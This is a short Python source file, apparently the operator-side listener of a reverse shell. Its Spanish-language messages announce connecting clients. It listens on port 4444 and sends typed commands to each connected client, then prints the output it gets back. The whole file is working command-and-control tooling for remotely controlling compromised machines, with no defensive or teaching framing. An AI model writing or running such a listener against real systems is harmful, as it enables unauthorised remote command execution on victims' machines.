import sys
import socket
import threading

SERVER_IP = 'your ip'
PORT = 4444

def handle_client(client_socket, client_address):
    print(f'[+] Cliente conectado: {client_address}')
    client_socket.send('conectadooo'.encode())
    
    try:
        while True:
            cmd = input('>>>> ')
            client_socket.send(cmd.encode())

            if cmd.lower() in ['quit', 'exit', 'q']:
                break

            resu = client_socket.recv(1024).decode()
            print(resu)
    except Exception as e:
        print(f'[!] Error manejando al cliente {client_address}: {e}')
    finally:
        client_socket.close()
        print(f'[+] Cliente desconectado: {client_address}')

def start_server():
    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_IP, PORT))
    server_socket.listen(5)
    print(f'[+] Servidor escuchando en {SERVER_IP}:{PORT}')

    try:
        while True:
            client_socket, client_address = server_socket.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()
    except KeyboardInterrupt:
        print('[+] Deteniendo el servidor...')
    except Exception as e:
        print(f'[!] Error en el servidor: {e}')
    finally:
        server_socket.close()
        print('[+] Servidor cerrado')

if __name__ == "__main__":
    start_server()
